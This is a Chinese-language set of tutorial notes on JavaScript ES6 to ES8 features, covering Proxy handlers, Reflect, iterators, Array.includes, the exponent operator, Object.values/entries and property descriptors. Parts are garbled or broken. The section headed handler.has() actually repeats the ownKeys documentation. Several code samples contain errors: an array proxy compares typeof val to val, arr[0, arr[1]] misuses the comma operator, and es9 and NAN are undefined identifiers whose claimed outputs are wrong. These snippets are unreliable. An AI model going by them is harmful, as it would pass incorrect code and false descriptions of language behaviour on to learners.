> **Proxy** 也就是代理，可以帮助我们完成很多事情，例如对数据的处理，对构造函数的处理，对数据的验证，说白了，就是在我们访问对象前添加了一层拦截，可以过滤很多操作，而这些过滤，由你来定义。

**语法：**

```
	  let p = new Proxy(target, handler);
```

1. [参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/get#参数)

   以下是传递给get方法的参数，`this上下文绑定在`handler对象上.

   - `target`

     目标对象。

   - `property`

     被获取的属性名。

   - `receiver`

     Proxy或者继承Proxy的对象

   [返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/get#返回值)

   get方法可以返回任何值。

   [描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/get#描述)

   **`handler.get`** 方法用于拦截对象的读取属性操作。

   [拦截](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/get#拦截)

   该方法会拦截目标对象的以下操作:

   - 访问属性: `proxy[foo]和` `proxy.bar`
   - 访问原型链上的属性: `Object.create(proxy)[foo]`
   - [`Reflect.get()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/get)

   [约束](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/get#约束)

   如果违背了以下的约束，proxy会抛出 [`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError):

   - 如果要访问的目标属性是不可写以及不可配置的，则返回的值必须与该目标属性的值相同。
   - 如果要访问的目标属性没有配置访问方法，即get方法是undefined的，则返回值必须为undefined。

###### handler.get()

下面是使用示例，一个简单的代理

```
       const obj = {
          name: 'admin'
        }
        const proxy = new Proxy(obj,
          {
            get(target, key) {
              console.log('获取了getter属性');
              return target[key] + ' proxy处理了';
            }
          }
        )
        proxy.age = 18
        obj.test = '测试'
        console.log(obj);
        console.log(obj.name);
        console.log(proxy);
        console.log(proxy.name);
```

输出结果：

![image-20210815210813394](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815210814.png)

可以看出obj被Proxy代理后，两个实例的内容是一致的，修改任意一个都会影响另一个，由此可知，两个实例的值引用的是一个地址, 但是修改target参数并不会改变实例的值，代理后并不会改变原有实例的值和方法

并且，我们在访问Proxy代理实例会触发get钩子，target是obj实例，key是访问的字段，get钩子返回值是就是访问的值

再来看一个基本用法：

```
  let test = {
    name: "小红"
  };
  test = new Proxy(test, {
    get(target, key) {
      console.log('获取了getter属性');
      return target[key];
    }
  });
  console.log(test.name);
```

![img](https://upload-images.jianshu.io/upload_images/18597164-87aebaafb3fbefe0.png?imageMogr2/auto-orient/strip|imageView2/2/w/541/format/webp)

###### handler.set()

> `handler.set()` 方法是设置属性值操作的捕获器。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/set#语法)

```
const p = new Proxy(target, {
  set: function(target, property, value, receiver) {
  }
});
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/set#参数)

以下是传递给 `set()` 方法的参数。`this` 绑定在 handler 对象上。

- `target`

  目标对象。

- `property`

  将被设置的属性名或 [`Symbol`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol)。

- `value`

  新属性值。

- `receiver`

  最初被调用的对象。通常是 proxy 本身，但 handler 的 set 方法也有可能在原型链上，或以其他方式被间接地调用（因此不一定是 proxy 本身）。**比如：**假设有一段代码执行 `obj.name = "jen"`， `obj` 不是一个 proxy，且自身不含 `name` 属性，但是它的原型链上有一个 proxy，那么，那个 proxy 的 `set()` 处理器会被调用，而此时，`obj` 会作为 receiver 参数传进来。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/set#返回值)

`set()` 方法应当返回一个布尔值。

- 返回 `true` 代表属性设置成功。
- 在严格模式下，如果 `set()` 方法返回 `false`，那么会抛出一个 [`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError) 异常。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/set#描述)

`handler.set()` 方法用于拦截设置属性值的操作。

[拦截](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/set#拦截)

该方法会拦截目标对象的以下操作:

- 指定属性值：`proxy[foo] = bar` 和 `proxy.foo = bar`
- 指定继承者的属性值：`Object.create(proxy)[foo] = bar`
- [`Reflect.set()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/set)

[约束](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/set#约束)

如果违背以下的约束条件，proxy 会抛出一个 [`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError) 异常：

- 若目标属性是一个不可写及不可配置的数据属性，则不能改变它的值。
- 如果目标属性没有配置存储方法，即 `[[Set]]` 属性的是 `undefined`，则不能设置它的值。
- 在严格模式下，如果 `set()` 方法返回 `false`，那么也会抛出一个 [`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError) 异常。



上方的案例，我们首先创建了一个**test**对象，里面有**name**属性，然后我们使用`Proxy`将其包装起来，再返回给**test**，此时的**test**已经成为了一个`Proxy`实例，我们对其的操作，都会被`Proxy`拦截。
 `Proxy`有两个参数，第一个是`target`,也就是我们传入的**test对象,另一个则是`handler`，也就是我们传入的第二个参数，一个匿名对象。在`handler`中定义了一个名叫`get`的函数，当我们获取 **test的属性时，则会触发此函数。
 咱们再来试试使用`set`来拦截一些操作，并将`get`返回值

```
  let xiaohong = {
    name: "小红",
    age: 15
  };
  xiaohong = new Proxy(xiaohong, {
    get(target, key) {
      let result = target[key];
      //如果是获取 年龄 属性，则添加 岁字
      if (key === "age") result += "岁";
      return result;
    },
    set(target, key, value) {
      if (key === "age" && typeof value !== "number") {
        throw Error("age字段必须为Number类型");
      }
      return Reflect.set(target, key, value);
    }
  });
  console.log(`我叫${xiaohong.name}  我今年${xiaohong.age}了`);
  xiaohong.age = "aa";
```

![img](https:////upload-images.jianshu.io/upload_images/18597164-175a2ba2468ae476.png?imageMogr2/auto-orient/strip|imageView2/2/w/770/format/webp)

上方案例中定义了 **xiaohong** 对象，其中有 **age** 和 **name** 两个字段,我们在`Proxy`中的 **get** 拦截函数中添加了一个判断，如果是取 **age** 属性的值，则在后面添加 **岁**。在 **set** 拦截函数中判断了如果是更改 **age** 属性时，类型不是 `Number`则抛出错误。最后,正确的输出了我们想要的结果!
 关于`return Reflect.set(target, key, value);` 这句代码，可以用其他方式替换，例如 :

```javascript
  let xiaohong = {
    name: "小红",
    age: 15
  };
  xiaohong = new Proxy(xiaohong, {
    get(target, key) {
      let result = target[key];
      //如果是获取 年龄 属性，则添加 岁字
      if (key === "age") result += "岁";
      return result;
    },
    set(target, key, value) {
      if (key === "age" && typeof value !== "number") {
        throw Error("age字段必须为Number类型");
      }
      target[key] = value;
      // return Reflect.set(target, key, value);
    }
  });
  console.log(`我叫${xiaohong.name}  我今年${xiaohong.age}了`);
  xiaohong.age = 12;
```

![img](https:////upload-images.jianshu.io/upload_images/18597164-8513dac84c1f9191.png?imageMogr2/auto-orient/strip|imageView2/2/w/631/format/webp)

```
let arr = []
arr = new Proxy(arr, {
	set(target, prop, val) {
		if(typeof val === val) {
			target[prop] = val
			return true
		} else {
			return false
		}
	}
})
arr.push(5)
arr.push(6)
console.log(arr[0, arr[1]], arr.length)   //5 6 2
```


 此时会抛出一个错误，因为`set`函数必须返回一个`boolean`值，只有返回值为`true`时才表示修改成功，我们没有手动`return`，函数会自动返回`undefined`,`undefined != true`,所以报错是正常的，只需要手动在最后添加一句 `return true`即可！
 但是，既然JS为我们提供了 `Reflect` ，那我们肯定是使用它啦，毕竟它和`Proxy`本来就是一起玩的,`Proxy`有的函数它都有！具体的参考 [官方链接](https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FReflect)
 这只是最基础的应用，其他的大家可以自行摸索，都是一样的用法！

###### handler.has()

> **`handler.has()`** 方法是针对 [`in`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in) 操作符的代理方法。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#语法)

```
var p = new Proxy(target, {
  ownKeys: function(target) {
  }
});
```

Copy to Clipboard

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#参数)

下面的参数被传递给`ownKeys。this`被绑定在`handler上。`

- `target`

  目标对象.

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#返回值)

`ownKeys` 方法必须返回一个可枚举对象.

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#描述)

`**handler.ownKeys()**` 方法用于拦截 [`Reflect.ownKeys()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/ownKeys).

[拦截](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#拦截)

该拦截器可以拦截以下操作::

- [`Object.getOwnPropertyNames()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyNames)
- [`Object.getOwnPropertySymbols()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertySymbols)
- [`Object.keys()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/keys)
- [`Reflect.ownKeys()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/ownKeys)

[约束](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#约束)

如果违反了下面的约束，proxy将抛出错误 [`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError):

- `ownKeys` 的结果必须是一个数组.
- 数组的元素类型要么是一个 [`String`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String) ，要么是一个 [`Symbol`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol).
- 结果列表必须包含目标对象的所有不可配置（non-configurable ）、自有（own）属性的key.
- 如果目标对象不可扩展，那么结果列表必须包含目标对象的所有自有（own）属性的key，不能有其它值.

**基础使用：**

```
const monster1 = {
  _age: 111,
  [Symbol('secret')]: 'I am scared!',
  eyeCount: 4
};

const handler1 = {
  ownKeys(target) {
    return Reflect.ownKeys(target);
  }
};

const proxy1 = new Proxy(monster1, handler1);

for (const key of Object.keys(proxy1)) {
  console.log(key);
  // expected output: "_age"
  // expected output: "eyeCount"
}
```

###### handler.OwnKeys

> **`handler.ownKeys()`** 方法用于拦截 Reflect.ownKeys()，Object.keys(),Object.getOwnPropertyNames(),Object.getOwnPropertySymbols()

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#语法)

```
var p = new Proxy(target, {
  ownKeys: function(target) {
  }
});
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#参数)

下面的参数被传递给`ownKeys。this`被绑定在`handler上。`

- `target`

  目标对象.

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#返回值)

`ownKeys` 方法必须返回一个可枚举对象.

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#描述)

`**handler.ownKeys()**` 方法用于拦截 [`Reflect.ownKeys()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/ownKeys).

[拦截](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#拦截)

该拦截器可以拦截以下操作::

- [`Object.getOwnPropertyNames()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyNames)
- [`Object.getOwnPropertySymbols()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertySymbols)
- [`Object.keys()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/keys)
- [`Reflect.ownKeys()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/ownKeys)

[约束](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/ownKeys#约束)

如果违反了下面的约束，proxy将抛出错误 [`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError):

- `ownKeys` 的结果必须是一个数组.
- 数组的元素类型要么是一个 [`String`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String) ，要么是一个 [`Symbol`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol).
- 结果列表必须包含目标对象的所有不可配置（non-configurable ）、自有（own）属性的key.
- 如果目标对象不可扩展，那么结果列表必须包含目标对象的所有自有（own）属性的key，不能有其它值.

###### handler.deleteProperty

> **`handler.deleteProperty()`** 方法用于拦截对对象属性的 [`delete`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/delete) 操作。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/deleteProperty#语法)

```
var p = new Proxy(target, {
  deleteProperty: function(target, property) {
  }
});
```

Copy to Clipboard

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/deleteProperty#参数)

`deleteProperty` 方法将会接受以下参数。 `this` 被绑定在 handler上。

- `target`

  目标对象。

- `property`

  待删除的属性名。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/deleteProperty#返回值)

`deleteProperty` 必须返回一个 [`Boolean`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean) 类型的值，表示了该属性是否被成功删除。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/deleteProperty#描述)

`**handler.deleteProperty()**` 方法可以拦截 [`delete`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/delete) 操作。

[拦截](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/deleteProperty#拦截)

该方法会拦截以下操作:

- 删除属性: `delete proxy[foo]` 和 `delete proxy.foo`
- [`Reflect.deleteProperty()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/deleteProperty)

[不变量](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/deleteProperty#不变量)

如果违背了以下不变量，proxy 将会抛出一个 [`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError):

- 如果目标对象的属性是不可配置的，那么该属性不能被删除。

基本用法：

```
 const monster1 = {
      _age: 111,
      eyeCount: 4
    };

    const handler1 = {
      //获取键值拦截钩子
      ownKeys(target) {
        for (let i in target) {
          //隐藏私有属性
          if (i[0] === '_') {
            delete target[i]
          }
        }
        return Object.keys(target)
      },
      //删除拦截钩子
      deleteProperty(target, prop) {
        if (prop.startsWith('_')) {
          throw new Error('不可删除')
        } else {
          delete target[prop]
          return true
        }
      }
    };
    const proxy1 = new Proxy(monster1, handler1);
    console.log(Object.keys(proxy1));   //["eyeCount"]
    delete proxy1._age   //不可以删除
```

##### Reflect(反射)

> **Reflect** 是一个内置的对象，它提供拦截 JavaScript 操作的方法。这些方法与[proxy handlers (en-US)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy)的方法相同。`Reflect`不是一个函数对象，因此它是不可构造的。
>
> 它的作用主要有以下几点：
>
> - 将Object属于语言内部的方法放到Reflect上
>
> - 修改某些Object方法的返回结果，让其变得更合理
>
> - 让Object操作变成函数行为
>
>   ```
>   console.log('assign' in Object)  //true
>   console.log(Reflect.has(Object,'assign'))  //true
>   ```
>
> - Reflect象的方法与Proxy对象的方法一一对应（也就是说，能够相对应地返回Proxy handler想要的返回值）

##### Iterator(迭代器)

> 遍历`Array`可以采用下标循环，遍历`Map`和`Set`就无法使用下标。为了统一集合类型，ES6标准引入了新的`iterable`类型
>
> - 是一种接口机制，为各种不同的数据解构提供统一访问的机制
> - 主要供for... of使用
> - 一句话：让不支持遍历的数据解构“可遍历”

**1、可迭代对象有**

- 1.`Array`
- 2.`String`
- 3.`Map`
- 4.`Set`
- 5.`arguments`
- 6.`NodeList`

2、判断一个数据是否具有可迭代能力,只有当数据具有`Symbol.iterator`属性的时候才可以使用`for...of`进行迭代

```
     console.log(Array.prototype.hasOwnProperty(Symbol.iterator)); //true
     console.log(Set.prototype.hasOwnProperty(Symbol.iterator));   /	/true
```

​	或者直接输出

```
	console.log([]);
```

![image-20210817012314030](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210817012314.png)

​	对象原型上有iterator，可迭代

3、在浏览器控制台打印信息(举例一个数组的)

![数组的迭代器](https://img-blog.csdnimg.cn/20181229174247655)

4、从上图看出`Array.prototype[Symbol.iterator]`是一个函数,使用`typeof`判断数据类型(如果不可迭代的返回是`undefined`)

```
     console.log(typeof [][Symbol.iterator]);		 //function
     console.log(typeof {}[Symbol.iterator]);           //undefined
     console.log(typeof new Set()[Symbol.iterator]);    //function
     console.log(typeof ''[Symbol.iterator]);		 //function
```

**手动模拟一个迭代器**
		1、迭代器的方法

```
     const createIterator = items => {
       const keys = Object.keys(items);
       const len = keys.length;
       let pointer = 0; // 当前的指针位置
       return {
         next() {
           const done = pointer >= len;
           const value = !done ? items[keys[pointer++]] : undefined; // 如果当前指针位置小于总长度
           return {
             value,
             done
           }
         }
       }
     }
```

2、测试数组

```
     const iterator1 = createIterator([1,2,3,4]);
     console.log(iterator1.next());
     console.log(iterator1.next());
     console.log(iterator1.next());
     console.log(iterator1.next());
     console.log(iterator1.next());
```

3、测试对象

```
     const iterator2 = createIterator({a: 'a', b: 'b', c: 'c'})
     console.log(iterator2.next());
     console.log(iterator2.next());
     console.log(iterator2.next());
     console.log(iterator2.next());
     console.log(iterator2.next());
```

**既然数组等具有可迭代的能力,但是我们直接使用数组.next()会报错的(用python中的说法,可迭代不代表是一个迭代器,只有迭代器才具有next()方法)**
	  	1、错误信息

​	2、通过上面方式判断已经具有可迭代能力的数据,如果要使用next函数,必须先将可迭代对象转成换迭代器。

​	3、可迭代对象不一定是迭代器,但是迭代器一定是可迭代对象

**将不可迭代的数据转换可迭代数据**
      	1、尝试在对象使用for..of

<img src="https://img-blog.csdnimg.cn/20181229174247754" alt="可迭代对象3" style="zoom:80%;" />

​	2、直接修改对象原型属性

​	注意一般我们开发中不会直接串改原型,我们直接挂载对象的方法上也行的

```
     Object.prototype[Symbol.iterator] = function() {
       const self = this;
       const keys = Object.keys(self);
       const len = keys.length;
       let pointer = 0;
       return {
         next() {
           const done = pointer >= len;
           const value = !done ? self[keys[pointer++]]: undefined;
           return {
             done,
             value
           }
         }
       }
     }
     let obj = {name: '哈哈', gender: '男'};
     let objItem = obj[Symbol.iterator]();
     console.log('===', objItem.next());
     for (const item of obj) {
       console.log(item)
     }
```

你可能会有疑问，`for ... of`循环和`for ... in`循环有何区别？

`for ... in`循环由于历史遗留问题，它遍历的实际上是对象的属性名称。一个`Array`数组实际上也是一个对象，它的每个元素的索引被视为一个属性。

当我们手动给`Array`对象添加了额外的属性后，`for ... in`循环将带来意想不到的意外效果：

```
     var a = ['A', 'B', 'C'];
     a.name = 'Hello';
     for (var x in a) {
         console.log(x); // '0', '1', '2', 'name'
     }
```

`for ... in`循环将把`name`包括在内，但`Array`的`length`属性却不包括在内。

`for ... of`循环则完全修复了这些问题，它只循环集合本身的元素：

```
     var a = ['A', 'B', 'C'];
     a.name = 'Hello';
     for (var x of a) {
         console.log(x); // 'A', 'B', 'C'
     }
```

这就是为什么要引入新的`for ... of`循环。

然而，更好的方式是直接使用`iterable`内置的`forEach`方法，它接收一个函数，每次迭代就自动回调该函数。以`Array`为例：

```
	var a = ['A', 'B', 'C'];
	a.forEach(function (element, index, array) { 
          // element: 指向当前元素的值 // index: 指向当前索引 // array: 指向Array对象本身 
          console.log(element + ', index = ' + index); 
	});
```

*注意*，`forEach()`方法是ES5.1标准引入的，你需要测试浏览器是否支持。

`Set`与`Array`类似，但`Set`没有索引，因此回调函数的前两个参数都是元素本身：

```
     var s = new Set(['A', 'B', 'C']);
     s.forEach(function (element, sameElement, set) {
         console.log(element);
     });
```

Map的回调函数参数依次为`value`、`key`和`map`本身：

```
     var m = new Map([[1, 'x'], [2, 'y'], [3, 'z']]);
     m.forEach(function (value, key, map) {
         console.log(value);
     });
```

如果对某些参数不感兴趣，由于JavaScript的函数调用不要求参数必须一致，因此可以忽略它们。例如，只需要获得`Array`的`element`：

```
     var a = ['A', 'B', 'C'];
     a.forEach(function (element) {
         console.log(element);
     });
```

#### ES7

![ECMAScript2016~2020 (ES7~11)](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210830015913.png)

##### 数组扩展

###### Array.prototype.includes

> `includes()` 方法用来判断一个数组是否包含一个指定的值，根据情况，如果包含则返回 true，否则返回false。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/includes#语法)

```
arr.includes(valueToFind[, fromIndex])
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/includes#参数)

- `valueToFind`

  需要查找的元素值。**Note:** 使用 `includes()`比较字符串和字符时是区分大小写。

- `fromIndex` 可选

  从`fromIndex` 索引处开始查找 `valueToFind`。如果为负值，则按升序从 `array.length + fromIndex` 的索引开始搜 （即使从末尾开始往前跳 `fromIndex` 的绝对值个索引，然后往后搜寻）。默认为 0。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/includes#返回值)

返回一个布尔值 [`Boolean`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean) ，如果在数组中找到了（如果传入了 `fromIndex` ，表示在 `fromIndex` 指定的索引范围中找到了）则返回 `true` 。

**基本使用：**

```
     const array1 = [1, 2, 3];

     console.log(array1.includes(2));
     // expected output: true

     const pets = ['cat', 'dog', 'bat'];

     console.log(pets.includes('cat'));
     // expected output: true
	//从索引为1开始查找
     console.log(pets.includes('at',1));
     // expected output: false
     //从索引为array.length + fromIndex= 1开始往后查找
     console.log(pets.includes('at',-2));
     // expected output: false
```

**Array.prototype.includes vs Array.prototype.indexOf()**

```
const arr = ['es6',['es7','es8'],es9,NaN] 
//返回值不一样
console.log(arr.includes(['es7','es8']))   //fasle
console.log(arr.indexOf(['es7','es8']))    //-1
//includes可以判断NAN，indexOf则认为不相等
console.log(arr.includes(NAN))   //true
console.log(arr.indexOf(NaN))    //-1
```

##### 数值扩展

###### 幂运算符：**

> 等同于Math.pow()

基本使用：

```
console.log(Math.pow(2,3))  //8
console.log(2 ** 3)         //8
console.log(Math.pow(2,4))  //16
console.log(2 ** 4)         //16
```

#### ES8

##### async/await

##### 对象扩展

###### Object.values

> `Object.values()`方法返回一个给定对象自身的所有可枚举属性值的数组，值的顺序与使用[`for...in`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in)循环的顺序相同 ( 区别在于 for-in 循环枚举原型链中的属性 )。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/values#语法)

```
Object.values(obj)
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/values#参数)

- `obj`

  被返回可枚举属性值的对象。

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/values#返回值)

一个包含对象自身的所有可枚举属性值的数组。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/values#描述)

`Object.values()`返回一个数组，其元素是在对象上找到的可枚举属性值。属性的顺序与通过手动循环对象的属性值所给出的顺序相同。

基本使用：

```
     var obj = { foo: 'bar', baz: 42 };
     console.log(Object.values(obj)); // ['bar', 42]

     var obj = { 0: 'a', 1: 'b', 2: 'c' };
     console.log(Object.values(obj)); // ['a', 'b', 'c']

     var an_obj = { 100: 'a', 2: 'b', 7: 'c' };
     console.log(Object.values(an_obj)); // ['b', 'c', 'a']

     var my_obj = Object.create({}, { getFoo: { value: function() { return this.foo; } } });
     my_obj.foo = 'bar';
     console.log(Object.values(my_obj)); // ['bar']

     console.log(Object.values('foo')); // ['f', 'o', 'o']
```

###### Object.entries

> `Object.entries()`方法返回一个给定对象自身可枚举属性的键值对数组，其排列与使用 [`for...in`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in) 循环遍历该对象时返回的顺序一致（区别在于 for-in 循环还会枚举原型链中的属性）。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/entries#语法)

```
Object.entries(obj)
```

[参数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/entries#参数)

- `obj`

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/entries#返回值)

​	可以返回其可枚举属性的键值对的对象。

基本使用；

```
const object1 = {
  a: 'somestring',
  b: 42
};

for (const [key, value] of Object.entries(object1)) {
  console.log(`${key}: ${value}`);
}
```

输出结果：

![image-20210822223023028](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210822223023.png)

###### 对象属性描述符

**描述符类型**

> 　　　　对象属性描述符的类型分为两种：数据属性和访问器属性

**数据属性**

　　数据属性(data property)包含一个数据值的位置，在这个位置可以读取和写入值。数据属性有4个特性

【1】[Configurable(可配置性)](https://www.cnblogs.com/xiaohuochai/p/5743821.html#configurable)

　　可配置性决定是否可以使用delete删除属性，以及是否可以修改属性描述符的特性，默认值为true

【2】[Enumerable(可枚举性)](https://www.cnblogs.com/xiaohuochai/p/5743821.html#enumerable)

　　可枚举性决定属性是否出现在对象的属性枚举中，比如是否可以通过for-in循环返回该属性，默认值为true

【3】[Writable(可写性)](https://www.cnblogs.com/xiaohuochai/p/5743821.html#writable)

　　可写性决定是否可以修改属性的值，默认值为true

【4】Value(属性值)

　　属性值包含这个属性的数据值，读取属性值的时候，从这个位置读；写入属性值的时候，把新值保存在这个位置。默认值为undefined

 

**访问器属性**

　　对象属性是名字、值和一组属性描述符构成的。而属性值可以用一个或两个方法替代，这两个方法就是getter和setter。而这种属性类型叫访问器属性(accessor property)

【1】[Configurable(可配置性)](https://www.cnblogs.com/xiaohuochai/p/5743821.html#configurable)

　　可配置性决定是否可以使用delete删除属性，以及是否可以修改属性描述符的特性，默认值为true

【2】[Enumerable(可枚举性)](https://www.cnblogs.com/xiaohuochai/p/5743821.html#enumerable)

　　可枚举性决定属性是否出现在对象的属性枚举中，比如是否可以通过for-in循环返回该属性，默认值为true

【3】[getter](https://www.cnblogs.com/xiaohuochai/p/5743821.html#get)

　　在读取属性时调用的函数。默认值为undefined

【4】[setter](https://www.cnblogs.com/xiaohuochai/p/5743821.html#get)

　　在写入属性时调用的函数。默认值为undefined

　　和数据属性不同，访问器属性不具有可写性(Writable)。如果属性同时具有getter和setter方法，那么它是一个读/写属性。如果它只有getter方法，那么它是一个只读属性。如果它只有setter方法，那么它是一个只写属性。读取只写属性总是返回undefined

 

**描述符方法**

　　前面介绍了属性描述符，要想设置它们，就需要用到描述符方法。描述符方法总共有以下5个：

【1】Object.getOwnPropertyDescriptor()

　　Object.getOwnPropertyDescriptor(o,name)方法用于查询一个属性的描述符，并以对象的形式返回

　　查询obj.a属性时，可配置性、可枚举性、可写性都是默认的true，而value是a的属性值1

　　查询obj.b属性时，因为obj.b属性不存在，该方法返回undefined

```
     var obj = {a:1};
     //Object {value: 1, writable: true, enumerable: true, configurable: true}
     console.log(Object.getOwnPropertyDescriptor(obj,'a'));
     //undefined
     console.log(Object.getOwnPropertyDescriptor(obj,'b'));
```

【2】Object.getOwnPropertyDescriptors()

​		`**Object.getOwnPropertyDescriptors()**` 方法用来获取一个对象的所有自身属性的描述符。

```
     var num = new String('12');
     console.log(Object.getOwnPropertyDescriptors(num));
```

输出：

![image-20210822234534606](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210822234534.png)

【3】Object.defineProperty()

　　Object.defineProperty(o,name,desc)方法用于创建或配置对象的一个属性的描述符，返回配置后的对象

　　使用该方法创建或配置对象属性的描述符时，如果不针对该属性进行描述符的配置，则该项描述符默认为false

```
     var obj = {};
     //{a:1}
     console.log(Object.defineProperty(obj,'a',{
             value:1,
             writable: true
         }));

     //由于没有配置enumerable和configurable，所以它们的值为false
